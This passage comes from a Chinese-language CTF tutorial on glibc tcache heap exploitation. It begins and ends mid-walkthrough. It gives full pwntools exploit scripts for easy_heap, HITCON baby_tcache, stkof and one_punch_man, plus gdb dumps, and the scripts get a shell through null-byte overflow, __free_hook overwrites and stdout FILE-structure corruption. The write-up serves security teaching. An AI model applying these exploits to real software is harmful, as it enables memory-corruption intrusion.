    # note that to avoid top consolidation, we need to arrange them like:
    # tcache * 6 -> unsortd  * 3 -> tcache
    for i in range(7):
        new(0x10, str(i) + ' - tcache')

    for i in range(3):
        new(0x10, str(i + 7) + ' - unsorted') # three unsorted bin chunks

    # arrange:
    for i in range(6):
        delete(i)
    delete(9)
    for i in range(6, 9):
        delete(i)
```

重分配后的堆结构：

```
+-----+
|     | <-- tcache perthread 结构体
+-----+
| ... | <-- 6 个 tcache 块
+-----+
|  A  | <-- 3 个 unsorted bin 块
+-----+
|  B  |
+-----+
|  C  |
+-----+
|     | <-- tcache 块，防止 top 合并
+-----+
| top |
|  .. |
```

###### 按照解析中的步骤进行 NULL 字节溢出触发

为了触发 NULL 字节溢出，我们需要使得解析中的 B 块可以溢出到 C 块中。由于题目中没有 edit 功能，所以我们需要让 B 块进入 tcache 中，这样就可以在释放后再分配出来，且由于 tcache 没有太多变化和检查，会较为稳定。

```python
    for i in range(7):
        new(0x10, str(i) + ' - tcache')

    # rearrange to take second unsorted bin into tcache chunk, but leave first 
    # unsorted bin unchanged
    new(0x10, '7 - first')
    new(0x10, '8 - second')
    new(0x10, '9 - third')

    for i in range(6):
        delete(i)
    # move second into tcache
    delete(8)
```

之后进行 A 块的释放（用来提供有效的可以进行 unlink 的 fd 和 bk 值）

```python
    # delete first to provide valid fd & bk
    delete(7)

```

现在堆块结构如下：

```
+-----+
|     | <-- tcache perthread 结构体
+-----+
| ... | <-- 6 个 tcache 块 (free)
+-----+
|  A  | <-- free
+-----+
|  B  | <-- free 且为 tcache 块
+-----+
|  C  |
+-----+
|     | <-- tcache 块，防止 top 合并
+-----+
| top |
|  .. |
```

tcache bin 链表中，第一位的是 B 块，所以现在可以将 B 块进行分配，且进行 NULL 字符溢出。

```python
    new(0xf8, '0 - overflow')
```

在之后的步骤中，我们需要 A 处于 unsorted bin 释放状态，B 处于分配状态，C 处于分配状态，且最后可以在 tcache 块 7 个全满的情况下进行释放（触发合并），所以我们需要 7 个 tcache 都被 free 掉。

此时由于 B 块被分配为 tcache 块了，所以需要将防止 top 合并的 tcache 块释放掉。

```python
    # fill up tcache
    delete(6)
```

之后就可以将 C 块释放，进行合并。

```python
    # trigger
    delete(9)

```

合并后的结构：

```
+-----+
|     | <-- tcache perthread 结构体
+-----+
| ... | <-- 6 个 tcache 块 (free)
+-----+                     --------+
|  A  | <-- free 大块               |
+-----+                             |
|  B  | <-- 已分配          --------+--> 一个大 free 块
+-----+                             |
|  C  | <-- free                    |
+-----+                     --------+
|     | <-- tcache 块，防止 top 合并 (free)
+-----+
| top |
|  .. |
```


###### 地址泄露

此时的堆已经出现交叉了，接下来将 A 大小从 unsorted bin 中分配出来，就可以使得 libc 地址落入 B 中：

```python
    # step 3: leak, fill up 
    for i in range(7):
        new(0x10, str(i) + ' - tcache')
    new(0x10, '8 - fillup')

    libc_leak = u64(show(0).strip().ljust(8, '\x00'))
    p.info('libc leak {}'.format(hex(libc_leak)))
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    libc.address = libc_leak - 0x3ebca0
```

堆结构：

```
+-----+
|     | <-- tcache perthread 结构体
+-----+
| ... | <-- 6 个 tcache 块 (free)
+-----+
|  A  | <-- 已分配
+-----+
|  B  | <-- 已分配          --------+> 一个大 free 块
+-----+                             |
|  C  | <-- free                    |
+-----+                     --------+
|     | <-- tcache 块，防止 top 合并 (free)
+-----+
| top |
|  .. |
```

###### tcache UAF attack

接下来，由于 B 块已经是 free 状态，但是又有指针指向，所以我们只需要再次分配，使得有两个指针指向 B 块，之后在 tcache 空间足够时，利用 tcache 进行 double free ，进而通过 UAF 攻击 free hook 即可。


```python
    # step 4: constrecvuntilct UAF, write into __free_hook
    new(0x10, '9 - next')
    # these two provides sendlineots for tcache
    delete(1)
    delete(2)

    delete(0)
    delete(9)
    new(0x10, p64(libc.symbols['__free_hook'])) # 0
    new(0x10, '/bin/sh\x00into target') # 1
    one_gadget = libc.address + 0x4f322 
    new(0x10, p64(one_gadget))

    # system("/bin/sh\x00")
    delete(1)

    p.interactive()

```

##### 完整 exploit

```python
#! /usr/bin/env python2
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
import sys
import os
import os.path
from pwn import *
context(os='linux', arch='amd64', log_level='debug')

p = process('./easy_heap')

def cmd(idx):
    p.recvuntil('>')
    p.sendline(str(idx))


def new(size, content):
    cmd(1)
    p.recvuntil('>')
    p.sendline(str(size))
    p.recvuntil('> ')
    if len(content) >= size:
        p.send(content)
    else:
        p.sendline(content)


def delete(idx):
    cmd(2)
    p.recvuntil('index \n> ')
    p.sendline(str(idx))


def show(idx):
    cmd(3)
    p.recvuntil('> ')
    p.sendline(str(idx))
    return p.recvline()[:-1]


def main():
    # Your exploit script goes here

    # step 1: get three unsortedbin chunks
    # note that to avoid top consolidation, we need to arrange them like:
    # tcache * 6 -> unsortd  * 3 -> tcache
    for i in range(7):
        new(0x10, str(i) + ' - tcache')

    for i in range(3):
        new(0x10, str(i + 7) + ' - unsorted') # three unsorted bin chunks

    # arrange:
    for i in range(6):
        delete(i)
    delete(9)
    for i in range(6, 9):
        delete(i)

    # step 2: use unsorted bin to overflow, and do unlink, trigger consolidation (overecvlineap)
    for i in range(7):
        new(0x10, str(i) + ' - tcache')

    # rearrange to take second unsorted bin into tcache chunk, but leave first 
    # unsorted bin unchanged
    new(0x10, '7 - first')
    new(0x10, '8 - second')
    new(0x10, '9 - third')

    for i in range(6):
        delete(i)
    # move second into tcache
    delete(8)
    # delete first to provide valid fd & bk
    delete(7)

    new(0xf8, '0 - overflow')
    # fill up tcache
    delete(6)

    # trigger
    delete(9)

    # step 3: leak, fill up 
    for i in range(7):
        new(0x10, str(i) + ' - tcache')
    new(0x10, '8 - fillup')

    libc_leak = u64(show(0).strip().ljust(8, '\x00'))
    p.info('libc leak {}'.format(hex(libc_leak)))
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    libc.address = libc_leak - 0x3ebca0

    # step 4: constrecvuntilct UAF, write into __free_hook
    new(0x10, '9 - next')
    # these two provides sendlineots for tcache
    delete(1)
    delete(2)

    delete(0)
    delete(9)
    new(0x10, p64(libc.symbols['__free_hook'])) # 0
    new(0x10, '/bin/sh\x00into target') # 1
    one_gadget = libc.address + 0x4f322 
    new(0x10, p64(one_gadget))

    # system("/bin/sh\x00")
    delete(1)

    p.interactive()

if __name__ == '__main__':
    main()
```


#### Challenge 2 : HITCON 2018 PWN baby_tcache

##### 基本信息

远程环境中的 libc 是 libc-2.27.so 和上面的题目一样。

```bash
zj@zj-virtual-machine:~/c_study/hitcon2018/pwn1$ checksec ./baby_tcache
[*] '/home/zj/c_study/hitcon2018/pwn1/baby_tcache'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
```

##### 基本功能

程序的功能很简单 ，就2个功能 ，一个功能为 New 申请使用内存不大于 0x2000 的 chunk ，总共可以申请 10 块 ，通过 bss 段上的一个全局数组 arr 来管理申请的 chunk ，同时 bss 段上的数组 size_arr 来存储相应 chunk 的申请大小 size 。

程序的另外一个功能就是 delete ，删除所选的堆块 ，删除之前会事先把 chunk 的内容区域按照申请的 size 覆盖成 0xdadadada 。

程序的漏洞代码在功能 New 的时候 ，写完数据后 ，有一个 null-byte 溢出漏洞 ，具体如下 ：

```c
int new()
{
  _QWORD *v0; // rax
  signed int i; // [rsp+Ch] [rbp-14h]
  _BYTE *malloc_p; // [rsp+10h] [rbp-10h]
  unsigned __int64 size; // [rsp+18h] [rbp-8h]

  for ( i = 0; ; ++i )
  {
    if ( i > 9 )
    {
      LODWORD(v0) = puts(":(");
      return (signed int)v0;
    }
    if ( !bss_arr[i] )
      break;
  }
  printf("Size:");
  size = str2llnum();
  if ( size > 0x2000 )
    exit(-2);
  malloc_p = malloc(size);
  if ( !malloc_p )
    exit(-1);
  printf("Data:");
  read_input((__int64)malloc_p, size);
  malloc_p[size] = 0;                           // null byte bof
  bss_arr[i] = malloc_p;
  v0 = size_arr;
  size_arr[i] = size;
  return (signed int)v0;
}
```

##### 利用思路

程序的漏洞很容易发现 ，而且申请的 chunk 大小可控 ，所以一般考虑构造 overlapping chunk 处理 。但是问题在于即使把 main_arena 相关的地址写到了 chunk 上 ，也没法调用 show 功能做信息泄露 ，因为程序就没提供这个功能 。

于是有两种思路：

1. 可以考虑 partial overwrite 去改掉 main_arena 相关地址的后几个字节 ，利用 tcache 机制把 `__free_hook` chunk 写进 tcache 的链表中 ，后面利用 unsortedbin attack 往 `__free_hook` 里面写上 unsortedbin addr ，后面把 `__free_hook` 分配出来 ，再利用 partial overwrite 在 `__free_hook` 里面写上 one_shoot ，不过这个方法的爆破工作量太大需要 4096 次

2. 通过 IO file 进行泄露。题目中使用到了 `puts` 函数，会最终调用到 `_IO_new_file_overflow`，该函数会最终使用 `_IO_do_write` 进行真正的输出。在输出时，如果具有缓冲区，会输出 `_IO_write_base` 开始的缓冲区内容，直到 `_IO_write_ptr` （也就是将 `_IO_write_base` 一直到 `_IO_write_ptr` 部分的值当做缓冲区，在无缓冲区时，两个指针指向同一位置，位于该结构体附近，也就是 libc 中），但是在 `setbuf` 后，理论上会不使用缓冲区。然而如果能够修改 `_IO_2_1_stdout_` 结构体的 flags 部分，使得其认为 stdout 具有缓冲区，再将 `_IO_write_base` 处的值进行 partial overwrite ，就可以泄露出 libc 地址了。

思路 2 中涉及到的相关代码：

`puts` 函数最终会调用到该函数，我们需要满足部分 flag 要求使其能够进入 `_IO_do_write`：

```c
int
_IO_new_file_overflow (_IO_FILE *f, int ch)
{
  if (f->_flags & _IO_NO_WRITES) 
    {
      f->_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return EOF;
    }
  /* If currently reading or no buffer allocated. */
  if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_IO_write_base == NULL) 
    {
      :
      :
    }
  if (ch == EOF)
    return _IO_do_write (f, f->_IO_write_base,  // 需要调用的目标，如果使得 _IO_write_base < _IO_write_ptr，且 _IO_write_base 处
                                                // 存在有价值的地址 （libc 地址）则可进行泄露
                                                // 在正常情况下，_IO_write_base == _IO_write_ptr 且位于 libc 中，所以可进行部分写
			 f->_IO_write_ptr - f->_IO_write_base);

```

进入后的部分：

```c
static
_IO_size_t
new_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)
{
  _IO_size_t count;
  if (fp->_flags & _IO_IS_APPENDING)  /* 需要满足 */
    /* On a system without a proper O_APPEND implementation,
       you would need to sys_seek(0, SEEK_END) here, but is
       not needed nor desirable for Unix- or Posix-like systems.
       Instead, just indicate that offset (before and after) is
       unpredictable. */
    fp->_offset = _IO_pos_BAD;
  else if (fp->_IO_read_end != fp->_IO_write_base)
    {
     ............
    }
  count = _IO_SYSWRITE (fp, data, to_do); // 这里真正进行 write

```

可以看到，为调用到目标函数位置，需要满足部分 flags 要求，具体需要满足的 flags ：

```c
_flags = 0xfbad0000  // Magic number
_flags & = ~_IO_NO_WRITES // _flags = 0xfbad0000
_flags | = _IO_CURRENTLY_PUTTING // _flags = 0xfbad0800
_flags | = _IO_IS_APPENDING // _flags = 0xfbad1800
```

##### 操作过程

- 形成 overlapping chunk

```python
    alloc(0x500-0x8)  # 0
    alloc(0x30)   # 1
    alloc(0x40)  # 2
    alloc(0x50)  # 3
    alloc(0x60)  # 4
    alloc(0x500-0x8)  # 5
    alloc(0x70)  # 6  gap to top
    
    delete(4)
    alloc(0x68,'A'*0x60+'\x60\x06')  # set the prev size
    
    delete(2)
    delete(0)
    delete(5)  # backward coeleacsing
```

```
gdb-peda$ x/300xg 0x0000555d56ed6000+0x250
0x555d56ed6250:	0x0000000000000000	0x0000000000000b61  ( free(#5) ==> merge into #0 get 0x660+0x500=0xb60 chunk ) #0
0x555d56ed6260:	0x00007fa8a0a3fca0	0x00007fa8a0a3fca0
0x555d56ed6270:	0x0000000000000000	0x0000000000000000
0x555d56ed6280:	0xdadadadadadadada	0xdadadadadadadada
...............
0x555d56ed6740:	0xdadadadadadadada	0xdadadadadadadada
0x555d56ed6750:	0x0000000000000500	0x0000000000000040   #1
0x555d56ed6760:	0x0000000000000061('a')	0x0000000000000000
0x555d56ed6770:	0x0000000000000000	0x0000000000000000
0x555d56ed6780:	0x0000000000000000	0x0000000000000000
0x555d56ed6790:	0x0000000000000000	0x0000000000000051   #2
0x555d56ed67a0:	0x0000000000000000	0xdadadadadadadada
...............
0x555d56ed67e0:	0x0000000000000000	0x0000000000000061   #3
0x555d56ed67f0:	0x0000000000000061('a')	0x0000000000000000
0x555d56ed6800:	0x0000000000000000	0x0000000000000000
...............
0x555d56ed6830:	0x0000000000000000	0x0000000000000000
0x555d56ed6840:	0x0000000000000000	0x0000000000000071   #4
0x555d56ed6850:	0x4141414141414141	0x4141414141414141
...............
0x555d56ed68b0:	0x0000000000000660	0x0000000000000500   #5
...............
```

- 改写文件结构体的相关字段

```python
    alloc(0x500-0x9+0x34)
    delete(4)
    alloc(0xa8,'\x60\x07')  # corrupt the fd
    
    alloc(0x40,'a')
   
    alloc(0x3e,p64(0xfbad1800)+p64(0)*3+'\x00')  # overwrite the file-structure !!!
```

```
gdb-peda$ x/20xg stdout
0x7fa8a0a40760 <_IO_2_1_stdout_>:	0x00000000fbad1800(!!!)	0x0000000000000000(!!!)
0x7fa8a0a40770 <_IO_2_1_stdout_+16>:	0x0000000000000000(!!!)	0x0000000000000000(!!!)
0x7fa8a0a40780 <_IO_2_1_stdout_+32>:	0x00007fa8a0a40700(!!!_IO_write_base)	0x00007fa8a0a407e3
0x7fa8a0a40790 <_IO_2_1_stdout_+48>:	0x00007fa8a0a407e3	0x00007fa8a0a407e3
0x7fa8a0a407a0 <_IO_2_1_stdout_+64>:	0x00007fa8a0a407e4	0x0000000000000000
0x7fa8a0a407b0 <_IO_2_1_stdout_+80>:	0x0000000000000000	0x0000000000000000
0x7fa8a0a407c0 <_IO_2_1_stdout_+96>:	0x0000000000000000	0x00007fa8a0a3fa00
0x7fa8a0a407d0 <_IO_2_1_stdout_+112>:	0x0000000000000001	0xffffffffffffffff
0x7fa8a0a407e0 <_IO_2_1_stdout_+128>:	0x000000000a000000	0x00007fa8a0a418c0
0x7fa8a0a407f0 <_IO_2_1_stdout_+144>:	0xffffffffffffffff	0x0000000000000000
gdb-peda$ x/20xg 0x00007fa8a0a40700
0x7fa8a0a40700 <_IO_2_1_stderr_+128>:	0x0000000000000000	0x00007fa8a0a418b0 (leak target)
0x7fa8a0a40710 <_IO_2_1_stderr_+144>:	0xffffffffffffffff	0x0000000000000000
0x7fa8a0a40720 <_IO_2_1_stderr_+160>:	0x00007fa8a0a3f780	0x0000000000000000
```

- 文件结构体更改缘由
  - 通过修改 stdout->_flags 使得程序流能够流到 _IO_do_write (f , f->_IO_write_base , f->_IO_write_ptr - f->_IO_write_base) 这个函数
  
- 完整 exp

```python
from pwn import *
r = process('./baby_tcache'), env={"LD_PRELOAD":"./libc.so.6"})

libc = ELF("./libc.so.6")

def menu(opt):
    r.sendlineafter("Your choice: ",str(opt))

def alloc(size,data='a'):
    menu(1)
    r.sendlineafter("Size:",str(size))
    r.sendafter("Data:",data)

def delete(idx):
    menu(2)
    r.sendlineafter("Index:",str(idx))

def exp():
    alloc(0x500-0x8)  # 0
    alloc(0x30) # 1
    alloc(0x40) # 2
    alloc(0x50) # 3
    alloc(0x60) # 4
    alloc(0x500 - 0x8) # 5
    alloc(0x70) # 6  gap to avoid top consolidation
    
    delete(4)
    alloc(0x68, 'A'*0x60 + '\x60\x06')  # set the prev size
    
    delete(2)
    delete(0)
    delete(5) # backward coeleacsing
    alloc(0x500 - 0x9 + 0x34)
    delete(4)
    alloc(0xa8, '\x60\x07') # corrupt the fd
    
    alloc(0x40, 'a')
   
    alloc(0x3e, p64(0xfbad1800) + p64(0) * 3 + '\x00') # overwrite the file-structure
    
    print(repr(r.recv(8)))
    print("leak!!!!!!!!!")
    info1 = r.recv(8)
    print(repr(info1))
    libc.address = u64(info1) - 0x3ed8b0
    log.info("libc @ " + hex(libc.address))
    alloc(0xa8, p64(libc.symbols['__free_hook']))
    alloc(0x60, "A")
    alloc(0x60, p64(libc.address + 0x4f322)) # one gadget with $rsp+0x40 = NULL
    delete(0)
    r.interactive()

if __name__=='__main__':
    exp()
```

##### Challenge 2 小结

这个程序的利用过程是一个有用的技巧，这种通过文件结构体的方式来实现内存的读写的相关资料可以参考台湾 Angelboy 的博客。在 hctf2018 steak 中，也存在一个信息泄露的问题，大多数人采用了 copy puts_addr 到 `__free_hook` 指针里实现信息泄露，但实际上也可以通过修改文件结构体的字段来实现信息泄露。

#### Challenge 3 : 2014 HITCON stkof

##### 基本信息

参见[unlink HITCON stkof 简介](./unlink.md#2014 HITCON stkof)

##### libc 2.26 tcache 利用方法

本题可以溢出较长字节，因此可以覆盖 chunk 的 fd 指针，在 libc 2.26 之后的 tcache 机制中，未对 fd 指针指向的 chunk 进行 size 检查，从而可以将 fd 指针覆盖任意地址。在 free 该被溢出 chunk 并且两次 malloc 后可以实现任意地址修改：


```python
from pwn import *
from GdbWrapper import GdbWrapper
from one_gadget import generate_one_gadget
context.log_level = "info"
context.endian = "little"
context.word_size = 64
context.os = "linux"
context.arch = "amd64"
context.terminal = ["deepin-terminal", "-x", "zsh", "-c"]
def Alloc(io, size):
    io.sendline("1")
    io.sendline(str(size))
    io.readline()
    io.readline()
def Edit(io, index, length, buf):
    io.sendline("2")
    io.sendline(str(index))
    io.sendline(str(length))
    io.send(buf)
    io.readline()
def Free(io, index):
    io.sendline("3")
    io.sendline(str(index))
    try:
        tmp = io.readline(timeout = 3)
    except Exception:
        io.interactive()
    print tmp
    if "OK" not in tmp and "FAIL" not in tmp:
        return tmp
def main(binary, poc):
    # test env
    bss_ptrlist = None
    free_index = None
    free_try = 2
    elf = ELF(binary)
    libc_real = elf.libc.path[: elf.libc.path.rfind('/') + 1]
    assert elf.arch == "amd64" and (os.path.exists(libc_real + "libc-2.27.so") or os.path.exists(libc_real + "libc-2.26.so"))
    while bss_ptrlist == None:
        # find bss ptr
        io = process(binary)
        gdbwrapper = GdbWrapper(io.pid)
        # gdb.attach(io)
        Alloc(io, 0x400)
        Edit(io, 1, 0x400, "a" * 0x400)
        Alloc(io, 0x400)
        Edit(io, 2, 0x400, "b" * 0x400)
        Alloc(io, 0x400)
        Edit(io, 3, 0x400, "c" * 0x400)
        Alloc(io, 0x400)
        Edit(io, 4, 0x400, "d" * 0x400)
        Alloc(io, 0x400)
        Edit(io, 5, 0x400, "e" * 0x400)
        heap = gdbwrapper.heap()
        heap = [(k, heap[k]) for k in sorted(heap.keys())]
        ptr_addr = []
        index = 1
        while True:
            for chunk in heap:
                address = chunk[0]
                info = chunk[1]
                ptr_addr_length = len(ptr_addr)
                if (info["mchunk_size"] & 0xfffffffffffffffe) == 0x410:
                    for x in gdbwrapper.search("bytes", str(chr(ord('a') + index - 1)) * 0x400):
                        if int(address, 16) + 0x10 == x["ADDR"]:
                            tmp = gdbwrapper.search("qword", x["ADDR"])
                            for y in tmp:
                                if binary.split("/")[-1] in y["PATH"]:
                                    ptr_addr.append(y["ADDR"])
                                    break
                        if (len(ptr_addr) != ptr_addr_length):
                            break
                if len(ptr_addr) != ptr_addr_length:
                    break
            index += 1
            if (index == 5):
                break
        bss_ptrlist = sorted(ptr_addr)[0]
        io.close()
    while free_index == None:
        io = process(binary)
        Alloc(io, 0x400)
        Alloc(io, 0x400)
        Alloc(io, 0x400)
        Free(io, free_try)
        Edit(io, free_try - 1, 0x400 + 0x18, "a" * 0x400 + p64(0) + p64(1041) + p64(0x12345678))
        try:
            Alloc(io, 0x400)
            Alloc(io, 0x400)
        except Exception:
            free_index = free_try
        free_try += 1
        io.close()
    # arbitrary write
    libc = ELF(binary).libc
    one_gadget_offsets = generate_one_gadget(libc.path)
    for one_gadget_offset in one_gadget_offsets:
        io = process(binary)
        libc = elf.libc
        gdbwrapper = GdbWrapper(io.pid)
        Alloc(io, 0x400)
        Alloc(io, 0x400)
        Alloc(io, 0x400)
        Free(io, free_index)
        Edit(io, free_index - 1, 0x400 + 0x18, "a" * 0x400 + p64(0) + p64(1041) + p64(bss_ptrlist - 0x08))
        Alloc(io, 0x400)
        Alloc(io, 0x400)
        ###leak libc
        Edit(io, 5, 0x18, p64(elf.got["free"]) * 2 + p64(elf.got["malloc"]))
        Edit(io, 0, 0x08, p64(elf.plt["puts"]))
        leaked = u64(Free(io, 2)[:-1].ljust(8, "\x00"))
        libc_base = leaked - libc.symbols["malloc"]
        system_addr = libc_base + libc.symbols["system"]
        one_gadget_addr = libc_base + one_gadget_offset
        Edit(io, 1, 0x08, p64(one_gadget_addr))
        Free(io, 1)
        try:
            io.sendline("id")
            log.info(io.readline(timeout=3))
        except Exception, e:
            io.close()
            continue
        io.interactive()
if __name__ == "__main__":
    binary = "./bins/a679df07a8f3a8d590febad45336d031-stkof"
    main(binary, "")
```

#### Challenge 4 : HITCON 2019 one_punch_man

##### 基本信息

开启了常见保护，题目环境为 glibc 2.29 ，使用 seccomp 开启了沙箱保护，只有白名单上的系统调用可以使用。

```bash
╭─wz@wz-virtual-machine ~/Desktop/CTF/xz_files/hitcon2019_one_punch_man ‹master› 
╰─$ checksec ./one_punch
[*] '/home/wz/Desktop/CTF/xz_files/hitcon2019_one_punch_man/one_punch'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
╭─wz@wz-virtual-machine ~/Desktop/CTF/xz_files/hitcon2019_one_punch_man ‹master*› 
╰─$ seccomp-tools dump ./one_punch
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x15 0x00 0x01 0x0000000f  if (A != rt_sigreturn) goto 0006
 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0006: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0012
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0012: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0014
 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0014: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0016
 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0016: 0x15 0x00 0x01 0x0000000c  if (A != brk) goto 0018
 0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0018: 0x15 0x00 0x01 0x00000009  if (A != mmap) goto 0020
 0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0020: 0x15 0x00 0x01 0x0000000a  if (A != mprotect) goto 0022
 0021: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0022: 0x15 0x00 0x01 0x00000003  if (A != close) goto 0024
 0023: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0024: 0x06 0x00 0x00 0x00000000  return KILL

```

##### 基本功能

Add 函数可以分配 `[0x80,0x400]` 大小的堆块，分配的函数为 `calloc` ，输入数据首先存储到栈上，之后再使用 `strncpy` 拷贝到 `bss` 上的数组里。

Delete 函数 `free` 堆块之后未清空，造成 `double free` 和 `UAF`

```c
void __fastcall Delete(__int64 a1, __int64 a2)
{
  unsigned int v2; // [rsp+Ch] [rbp-4h]

  MyPuts("idx: ");
  v2 = read_int();
  if ( v2 > 2 )
    error("invalid", a2);
  free(*((void **)&unk_4040 + 2 * v2));
}
```
后门函数可以调用 `malloc` 分配 `0x217` 大小的堆块，但是要要满足 `*(_BYTE *)(qword_4030 + 0x20) > 6` ，我们在 `main` 函数里可以看到这里被初始化为 `heap_base+0x10` ，对于 glibc 2.29，这个位置对应存储的是 `tcache_perthread_struct` 的 `0x220` 大小的 `tcache_bin` 的数量，正常来说，如果我们想调用后门的功能，要让这个 `count` 为 7 ，然而这也就意味着 `0x217` 再分配和释放都同 `glibc 2.23` 一样，我们无法通过 `UAF` 改 chunk 的 `fd` 来达到任意地址写的目的，因此我们要通过别的方式修改这个值。
```c
__int64 __fastcall Magic(__int64 a1, __int64 a2)
{
  void *buf; // [rsp+8h] [rbp-8h]

  if ( *(_BYTE *)(qword_4030 + 0x20) <= 6 )
    error("gg", a2);
  buf = malloc(0x217uLL);
  if ( !buf )
    error("err", a2);
  if ( read(0, buf, 0x217uLL) <= 0 )
    error("io", buf);
  puts("Serious Punch!!!");
  puts(&unk_2128);
  return puts(buf);
}
```
Edit 和 Show 函数分别可以对堆块内容进行编辑和输出。

##### 利用思路

由于 glibc 2.29 中新增了对于 `unsorted bin` 链表完整性检查，这使得 `unsorted bin attack` 完全失效，我们的目标是往一个地址中写入 `large value` ，这种情况下就可以选择 `tcache stashing unlink attack`。

首先我们可以通过UAF来泄露 `heap` 和 `libc` 地址。具体方式是分配并释放多个chunk使其进入 `tcache` ，通过 `Show` 函数可以输出 `tcache bin` 的 `fd` 值来泄露堆地址。释放某个 `small bin size` 范围内的chunk七个，在第八次释放时会先把释放的堆块放入 `unsorted bin` 。通过 `Show` 函数可以泄露出 libc 地址。

我们首先通过 `UAF` 将 `__malloc_hook` 链入 `tcache` 备用。然后分配并释放六次 `0x100` 大小的chunk进入 `tcache` 。通过 `unsorted bin` 切割得到 `last remainer` 的方式得到两个大小为 `0x100` 的chunk。再分配一个超过 0x100 的块使其进入 `small bin` 。按照释放顺序我们称之为 bin1 和 bin2 。修改 `bin2->bk` 为 `(heap_base+0x2f)-0x10` ，调用 `calloc(0xf0)` 触发 `small bin` 放入 `tcache` 的处理逻辑，由于 `tcache` 中有 6 个块，因此循环处理只会进行一次，这样也避免了 fake_chunk 因 bk 处无可写地址作为下一个块进行 unlink 时 `bck->fd=bin` 带来的内存访问错误。最终改掉 `heap_base+0x30` 的值绕过检查。

##### 利用步骤

下面在调用 calloc 前下断点，可以看到此时 `tcache[0x100]` 有 6 个堆块，small bin 的分配顺序为 `0x000055555555c460->0x55555555cc80->0x000055555555901f` ，在 `calloc(0xf0)` 调用后， `0x000055555555c460` 会被返回给用户， `0x55555555cc80` 被链入tcache，而由于没有多余位置，跳出循环， `0x000055555555901f` 不做处理。

```bash
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x55555555d9d0 (size : 0x1c630) 
       last_remainder: 0x55555555cc80 (size : 0x100) 
            unsortbin: 0x0
(0x030)  smallbin[ 1]: 0x555555559ba0
(0x100)  smallbin[14]: 0x55555555cc80 (doubly linked list corruption 0x55555555cc80 != 0x100 and 0x55555555cc80 is broken)          
(0x100)   tcache_entry[14](6): 0x55555555a3f0 --> 0x55555555a2f0 --> 0x55555555a1f0 --> 0x55555555a0f0 --> 0x555555559ff0 --> 0x555555559ab0
(0x130)   tcache_entry[17](7): 0x555555559980 --> 0x555555559850 --> 0x555555559720 --> 0x5555555595f0 --> 0x5555555594c0 --> 0x555555559390 --> 0x555555559260
(0x220)   tcache_entry[32](1): 0x55555555d7c0 --> 0x7ffff7fb4c30
(0x410)   tcache_entry[63](7): 0x55555555bd50 --> 0x55555555b940 --> 0x55555555b530 --> 0x55555555b120 --> 0x55555555ad10 --> 0x55555555a900 --> 0x55555555a4f0
gdb-peda$ x/4gx 0x55555555cc80
0x55555555cc80: 0x0000000000000000      0x0000000000000101
0x55555555cc90: 0x000055555555c460      0x000055555555901f
gdb-peda$ x/4gx 0x000055555555c460
0x55555555c460: 0x0000000000000000      0x0000000000000101
0x55555555c470: 0x00007ffff7fb4d90      0x000055555555cc80
gdb-peda$ x/4gx 0x00007ffff7fb4d90
0x7ffff7fb4d90 <main_arena+336>:        0x00007ffff7fb4d80      0x00007ffff7fb4d80                                                  
0x7ffff7fb4da0 <main_arena+352>:        0x000055555555cc80      0x000055555555c460
```
calloc 分配完成之后的结果和我们预期一致， `0x000055555555901f` 作为 `fake_chunk` 其 `fd` 也被改写为了 `libc` 地址
```bash
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x55555555d9d0 (size : 0x1c630) 
       last_remainder: 0x55555555cc80 (size : 0x100) 
            unsortbin: 0x0
(0x030)  smallbin[ 1]: 0x555555559ba0
(0x100)  smallbin[14]: 0x55555555cc80 (doubly linked list corruption 0x55555555cc80 != 0x700 and 0x55555555cc80 is broken)          
(0x100)   tcache_entry[14](7): 0x55555555cc90 --> 0x55555555a3f0 --> 0x55555555a2f0 --> 0x55555555a1f0 --> 0x55555555a0f0 --> 0x555555559ff0 --> 0x555555559ab0
